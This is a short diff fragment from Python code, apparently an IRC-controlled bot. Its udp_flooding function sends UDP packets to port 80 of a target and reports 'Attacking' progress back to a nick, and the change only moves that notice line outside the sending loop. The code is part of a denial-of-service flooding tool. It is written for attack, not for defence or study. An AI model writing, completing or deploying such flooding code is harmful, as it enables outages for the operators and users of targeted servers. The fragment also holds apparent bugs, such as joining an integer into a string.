@@ -91,5 +91,5 @@ def udp_flooding(target, time, c, nick):      #async pas au point pour le moment
             pass
         client.sendto(buffer, (target, 80))     #sur le port 80 oui 
         sent = sent + 1
-        c.notice(nick, "Attacking "+ sent +"sent packages "+ target +" at the port " + 80)
+    c.notice(nick, "Attacking "+ sent +"sent packages "+ target +" at the port " + 80)
 
